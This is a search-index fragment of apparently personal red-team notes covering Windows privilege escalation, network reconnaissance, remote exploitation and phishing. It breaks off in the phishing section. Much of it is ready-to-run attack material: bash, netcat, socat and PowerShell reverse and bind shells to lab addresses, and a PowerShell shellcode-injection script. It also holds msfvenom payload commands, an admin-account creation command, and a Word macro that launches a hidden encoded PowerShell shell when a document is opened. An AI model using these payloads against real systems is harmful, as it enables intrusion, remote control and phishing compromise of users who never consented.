Enumeration"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#firewall-status-and-rules","text":"netsh advfirewall show currentprofile netsh advfirewall firewall show rule name = all","title":"Firewall Status and Rules"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#enumeration-tools","text":"windows-privesc-check windows-privesc-check2.exe --help winPEASexe winPEASx86.exe","title":"Enumeration Tools"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#more-commands","text":"","title":"More commands"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#add-local-admin-user","text":"net user /add <user> <pass> net localgroup administrators <user> /add","title":"Add Local Admin User"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#run-cmd-as-admin","text":"powershell.exe Start-Process cmd.exe -Verb runAs","title":"Run CMD as Admin"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#clear-text-stored","text":"reg query HKLM /f pass /t REG_SZ /s","title":"Clear text stored"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/","text":"Scanning Scripting here Network Sweeping ping nmap netdiscover #!/bin/bash if [ -z $1 ] ; then echo \"Usage: $0 <SubIP>\" exit fi for ip in $( seq 1 254 ) ; do ping -c 1 $1 . $ip | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 & done nmap -sn 192 .168.11.0/24 netdiscover -r 192 .168.11.0/24 Open Port Scanning Netcat Masscan Nmap TCP nc -nv -w 1 -z $ip 1 -65535 UDP nc -nv -w 1 -z -u $ip 1 -65535 TCP sudo masscan -i tun0 $ip -p0-65535 --rate 1000 sudo masscan -p80 192 .168.11.0/24 UDP masscan -pU 53 $ip Quick scan nmap --top-port 100 $ip Grep ports ports = $( nmap -p- --min-rate 1000 $ip | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) TCP connect scan (-sT) takes much longer to complete than SYN scan (-sS). SYN Scan sudo nmap -sS -p- $ip TCP Connect Scan sudo nmap -sT -p- $ip UDP Scan sudo nmap -sU -p- $ip Service Enumeration Common Services nmap -sC -sV -p $ports $ip nmap -sC -sV -A -p $ports $ip OS Fingerprinting sudo nmap -O $ip NSE Scripts vuln sudo nmap --script = vuln $ip smb-os-discovery sudo nmap --script = smb-os-discovery $ip smb-vul* sudo nmap --script smb-vul* -p 139 ,445 $ip ms-sql-brute sudo nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> dns-zone-transfer sudo nmap --script = dns-zone-transfer -p 53 leecybersec.com Nmap Cheat Sheet","title":"Active Scanning"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#scanning","text":"Scripting here","title":"Scanning"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#network-sweeping","text":"ping nmap netdiscover #!/bin/bash if [ -z $1 ] ; then echo \"Usage: $0 <SubIP>\" exit fi for ip in $( seq 1 254 ) ; do ping -c 1 $1 . $ip | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 & done nmap -sn 192 .168.11.0/24 netdiscover -r 192 .168.11.0/24","title":"Network Sweeping"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#open-port-scanning","text":"Netcat Masscan Nmap TCP nc -nv -w 1 -z $ip 1 -65535 UDP nc -nv -w 1 -z -u $ip 1 -65535 TCP sudo masscan -i tun0 $ip -p0-65535 --rate 1000 sudo masscan -p80 192 .168.11.0/24 UDP masscan -pU 53 $ip Quick scan nmap --top-port 100 $ip Grep ports ports = $( nmap -p- --min-rate 1000 $ip | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) TCP connect scan (-sT) takes much longer to complete than SYN scan (-sS). SYN Scan sudo nmap -sS -p- $ip TCP Connect Scan sudo nmap -sT -p- $ip UDP Scan sudo nmap -sU -p- $ip","title":"Open Port Scanning"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#service-enumeration","text":"Common Services nmap -sC -sV -p $ports $ip nmap -sC -sV -A -p $ports $ip","title":"Service Enumeration"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#os-fingerprinting","text":"sudo nmap -O $ip","title":"OS Fingerprinting"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#nse-scripts","text":"vuln sudo nmap --script = vuln $ip smb-os-discovery sudo nmap --script = smb-os-discovery $ip smb-vul* sudo nmap --script smb-vul* -p 139 ,445 $ip ms-sql-brute sudo nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> dns-zone-transfer sudo nmap --script = dns-zone-transfer -p 53 leecybersec.com","title":"NSE Scripts"},{"location":"red-teaming/network-pentest/reconnaissance/active-scanning/#nmap-cheat-sheet","text":"","title":"Nmap Cheat Sheet"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/","text":"Information Gathering OSINT Framework Maltego Shodan Searching Shodan For Fun And Profit city : find devices in a particular city country : find devices in a particular country geo : you can pass it coordinates hostname : find values that match the hostname net : search based on an IP or /x CIDR os : search based on operating system port : find particular ports that are open before/after : find results within a timeframe Security Header https://securityheaders.com/?q = leecybersec.com & followRedirects = on SSL Labs https://www.ssllabs.com/ssltest/analyze.html?d = leecybersec.com & latest Social Searcher https://www.social-searcher.com/social-buzz/?q5 = leecybersec.com Google Hacking site:leecybersec.com filetype:html site:leecybersec.com -filetype:html intitle: \"index of\" \"backup\" Google Hacking Database Source Code Public About searching on GitHub in :file web user:leecybersec gitleaks -v -r = https://github.com/leecybersec/client-splunk Netcraft Netcraft\u2019s DNS search: https://searchdns.netcraft.com https://searchdns.netcraft.com/?restriction = site+contains & host = .leecybersec.com & position = limited \"site report\": https://sitereport.netcraft.com https://sitereport.netcraft.com/?url = https%3A%2F%2Fleecybersec.com Recon-ng marketplace search site marketplace info recon/domains-hosts/bing_domain_web marketplace install recon/domains-hosts/bing_domain_web modules load recon/domains-hosts/bing_domain_web options set source leecybersec.com Theharvester theHarvester -d leecybersec.com -b google linkedin2username python3 linkedin2username.py -u 'linkedin-username' -n <domain> -c <company-name>","title":"Info Gathering"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#information-gathering","text":"","title":"Information Gathering"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#osint-framework","text":"","title":"OSINT Framework"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#maltego","text":"","title":"Maltego"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#shodan","text":"Searching Shodan For Fun And Profit city : find devices in a particular city country : find devices in a particular country geo : you can pass it coordinates hostname : find values that match the hostname net : search based on an IP or /x CIDR os : search based on operating system port : find particular ports that are open before/after : find results within a timeframe","title":"Shodan"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#security-header","text":"https://securityheaders.com/?q = leecybersec.com & followRedirects = on","title":"Security Header"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#ssl-labs","text":"https://www.ssllabs.com/ssltest/analyze.html?d = leecybersec.com & latest","title":"SSL Labs"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#social-searcher","text":"https://www.social-searcher.com/social-buzz/?q5 = leecybersec.com","title":"Social Searcher"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#google-hacking","text":"site:leecybersec.com filetype:html site:leecybersec.com -filetype:html intitle: \"index of\" \"backup\" Google Hacking Database","title":"Google Hacking"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#source-code-public","text":"About searching on GitHub in :file web user:leecybersec gitleaks -v -r = https://github.com/leecybersec/client-splunk","title":"Source Code Public"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#netcraft","text":"Netcraft\u2019s DNS search: https://searchdns.netcraft.com https://searchdns.netcraft.com/?restriction = site+contains & host = .leecybersec.com & position = limited \"site report\": https://sitereport.netcraft.com https://sitereport.netcraft.com/?url = https%3A%2F%2Fleecybersec.com","title":"Netcraft"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#recon-ng","text":"marketplace search site marketplace info recon/domains-hosts/bing_domain_web marketplace install recon/domains-hosts/bing_domain_web modules load recon/domains-hosts/bing_domain_web options set source leecybersec.com","title":"Recon-ng"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#theharvester","text":"theHarvester -d leecybersec.com -b google","title":"Theharvester"},{"location":"red-teaming/network-pentest/reconnaissance/infor-gathering/#linkedin2username","text":"python3 linkedin2username.py -u 'linkedin-username' -n <domain> -c <company-name>","title":"linkedin2username"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/","text":"Unix Remote Code Execution msfvenom Shell File msfvenom -p linux/x86/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f elf > shell.elf Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p linux/x86/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders Bash Reverse Shell Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash /bin/sh -c 'sh -i >& /dev/tcp/myip/443 0>&1' /bin/bash -c 'bash -i >& /dev/tcp/myip/443 0>&1' /bin/sh -c '0<&60-;exec 60<>/dev/tcp/myip/443;sh <&60 >&60 2>&60' Netcat Reverse Shell Kali machine sudo nc -nlvp 443 Unix machine nc -nv 192 .168.11.130 443 -e /bin/sh Netcat OpenBsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Netcat BusyBox rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Socat Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Unix machine socat TCP4:192.168.11.130:443 EXEC:/bin/sh Socat Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Unix machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/sh Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0 Nmap NSE Scripts Exploit cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse Upgrade shell /usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg stty -a stty rows 41 columns 172 msfconsole multi handler sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate' PayloadsAllTheThings Exploit Resources Online Offline Exploit Database SecurityFocus Packet Storm Reverse Shell Cheatsheet SearchSploit Metasploit Framework BeEF","title":"Unix&Linux"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#unix-remote-code-execution","text":"","title":"Unix Remote Code Execution"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#msfvenom","text":"Shell File msfvenom -p linux/x86/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f elf > shell.elf Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p linux/x86/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders","title":"msfvenom"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#bash-reverse-shell","text":"Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash /bin/sh -c 'sh -i >& /dev/tcp/myip/443 0>&1' /bin/bash -c 'bash -i >& /dev/tcp/myip/443 0>&1' /bin/sh -c '0<&60-;exec 60<>/dev/tcp/myip/443;sh <&60 >&60 2>&60'","title":"Bash Reverse Shell"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#netcat-reverse-shell","text":"Kali machine sudo nc -nlvp 443 Unix machine nc -nv 192 .168.11.130 443 -e /bin/sh Netcat OpenBsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Netcat BusyBox rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f","title":"Netcat Reverse Shell"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#socat-reverse-shell","text":"Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Unix machine socat TCP4:192.168.11.130:443 EXEC:/bin/sh","title":"Socat Reverse Shell"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#socat-encrypted-bind-shell","text":"Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Unix machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/sh Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0","title":"Socat Encrypted Bind Shell"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#nmap-nse-scripts-exploit","text":"cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse","title":"Nmap NSE Scripts Exploit"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#upgrade-shell","text":"/usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg stty -a stty rows 41 columns 172","title":"Upgrade shell"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#msfconsole-multi-handler","text":"sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate'","title":"msfconsole multi handler"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#payloadsallthethings","text":"","title":"PayloadsAllTheThings"},{"location":"red-teaming/network-pentest/remote-exploitation/Unix%26Linux/#exploit-resources","text":"Online Offline Exploit Database SecurityFocus Packet Storm Reverse Shell Cheatsheet SearchSploit Metasploit Framework BeEF","title":"Exploit Resources"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/","text":"Windows Remote Code Execution PowerShell Encoded Payload File reverse_shell_cleartext.ps1 $client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Encode payload and copy it to clipboard cat reverse_shell_cleartext.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Execute payload from clipboard powershell -enc $(vs) Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\" Unrestricted and XClipborad Set-ExecutionPolicy Unrestricted Get-ExecutionPolicy Install XClipboard sudo apt install xclip Alias XClipboard command with short character. alias \"cs=xclip -selection clipboard\" alias \"vs=xclip -o -selection clipboard\" In-memory payload injection script $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' ; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru ; [Byte[]] ; [Byte[]] $sc = < place your shellcode here >; $size = 0x1000 ; if ( $sc . Length -gt 0x1000 ) { $size = $sc . Length }; $x = $winFunc :: VirtualAlloc ( 0 , $size , 0x3000 , 0x40 ); for ( $i = 0 ; $i -le ( $sc . Length - 1 ); $i ++) { $winFunc :: memset ( [IntPtr] ( $x . ToInt32 ()+ $i ), $sc [ $i ], 1 )}; $winFunc :: CreateThread ( 0 , 0 , $x , 0 , 0 , 0 ); for (;;) { Start-sleep 60 }; Powercat Create Environment Windows machine . .\\ powercat . ps1 iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Kali machine sudo apt install powercat cat /usr/share/windows-resources/powercat/powercat.ps1 Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe Stand-Alone Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -g > shell.ps1 . \\s hell.ps1 Encoded Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -ge > encoded_shell.ps1 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA = Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powercat -l -p 443 -e cmd.exe Netcat Packed File upx -9 nc.exe Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine nc -nv 192 .168.11.130 443 -e cmd.exe Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine nc -nlvp 443 -e cmd.exe Socat Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Windows machine socat TCP4:192.168.11.130:443 EXEC:cmd.exe Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Windows machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:cmd.exe Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0 Remote desktop rdesktop $ip -u Tester -p Pass xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp Build Windows Binary File i686-w64-mingw32-gcc 42341 .c -o syncbreeze_exploit.exe -lws2_32 wine32 syncbreeze_exploit.exe msfconsole multi handler sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate' Nmap NSE Scripts Exploit cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse PayloadsAllTheThings Exploit Resources Online Offline Shell File Java Code Shell Code Encoders Exploit Database SecurityFocus Packet Storm Metasploit Framework BeEF msfvenom -p windows/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f exe > shell.exe msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" msfvenom --list encoders","title":"Windows"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#windows-remote-code-execution","text":"","title":"Windows Remote Code Execution"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#powershell","text":"Encoded Payload File reverse_shell_cleartext.ps1 $client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Encode payload and copy it to clipboard cat reverse_shell_cleartext.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Execute payload from clipboard powershell -enc $(vs) Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\" Unrestricted and XClipborad Set-ExecutionPolicy Unrestricted Get-ExecutionPolicy Install XClipboard sudo apt install xclip Alias XClipboard command with short character. alias \"cs=xclip -selection clipboard\" alias \"vs=xclip -o -selection clipboard\" In-memory payload injection script $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' ; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru ; [Byte[]] ; [Byte[]] $sc = < place your shellcode here >; $size = 0x1000 ; if ( $sc . Length -gt 0x1000 ) { $size = $sc . Length }; $x = $winFunc :: VirtualAlloc ( 0 , $size , 0x3000 , 0x40 ); for ( $i = 0 ; $i -le ( $sc . Length - 1 ); $i ++) { $winFunc :: memset ( [IntPtr] ( $x . ToInt32 ()+ $i ), $sc [ $i ], 1 )}; $winFunc :: CreateThread ( 0 , 0 , $x , 0 , 0 , 0 ); for (;;) { Start-sleep 60 };","title":"PowerShell"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#powercat","text":"Create Environment Windows machine . .\\ powercat . ps1 iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Kali machine sudo apt install powercat cat /usr/share/windows-resources/powercat/powercat.ps1 Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe Stand-Alone Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -g > shell.ps1 . \\s hell.ps1 Encoded Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -ge > encoded_shell.ps1 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA = Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powercat -l -p 443 -e cmd.exe","title":"Powercat"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#netcat","text":"Packed File upx -9 nc.exe Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine nc -nv 192 .168.11.130 443 -e cmd.exe Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine nc -nlvp 443 -e cmd.exe","title":"Netcat"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#socat","text":"Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Windows machine socat TCP4:192.168.11.130:443 EXEC:cmd.exe Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Windows machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:cmd.exe Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0","title":"Socat"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#remote-desktop","text":"rdesktop $ip -u Tester -p Pass xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp","title":"Remote desktop"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#build-windows-binary-file","text":"i686-w64-mingw32-gcc 42341 .c -o syncbreeze_exploit.exe -lws2_32 wine32 syncbreeze_exploit.exe","title":"Build Windows Binary File"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#msfconsole-multi-handler","text":"sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate'","title":"msfconsole multi handler"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#nmap-nse-scripts-exploit","text":"cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse","title":"Nmap NSE Scripts Exploit"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#payloadsallthethings","text":"","title":"PayloadsAllTheThings"},{"location":"red-teaming/network-pentest/remote-exploitation/windows/#exploit-resources","text":"Online Offline Shell File Java Code Shell Code Encoders Exploit Database SecurityFocus Packet Storm Metasploit Framework BeEF msfvenom -p windows/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f exe > shell.exe msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" msfvenom --list encoders","title":"Exploit Resources"},{"location":"red-teaming/powershell-empire/","text":"","title":"Index"},{"location":"red-teaming/social-engineering/","text":"Phishing Some Fish Client Fingerprinting FingerprintJS HTML Applications File: index.hta <html> <body> <script> var c= 'cmd.exe' new ActiveXObject('WScript.Shell').Run(c); </script> </body> </html> File: evil.hta sudo msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = <port> -f hta-psh -o /var/www/html/evil.hta Microsoft Office Microsoft Word Macro str = \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\" n = 50 for i in range ( 0 , len ( str ), n ): print \"Str = Str + \" + '\"' + str [ i : i + n ] + '\"' Sub AutoOpen () ReverseShell End Sub Sub Document_Open () ReverseShell End Sub Sub ReverseShell () Dim Str As String Str = Str + \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad\" Str = Str + \"ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA\" ... Str = Str + \"yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA\" Str = Str + \"G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM\" Str = Str + \"AdABhAHIAdAAoACQAcwApADsA\" CreateObject ( \"Wscript.Shell\" ) .Run Str End Sub Object Linking and Embedding ReverseShell.bat START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad... Web Phishing","title":"Social Engineering"},{"location":"red-teaming/social-engineering/#phishing-some-fish","text":"","title":"Phishing Some Fish"},{"location":"red-teaming/social-engineering/#client-fingerprinting","text":"FingerprintJS","title":"Client Fingerprinting"},{"location":"red-teaming/social-engineering/#html-applications","text":"File: index.hta <html> <body> <script> var c= 'cmd.exe' new ActiveXObject('WScript.Shell').Run(c); </script> </body> </html> File: evil.hta sudo msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = <port> -f hta-psh -o /var/www/html/evil.hta","title":"HTML Applications"},{"location":"red-teaming/social-engineering/#microsoft-office","text":"","title":"Microsoft Office"},{"location":"red-teaming/social-engineering/#microsoft-word-macro","text":"str = \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\" n = 50 for i in range 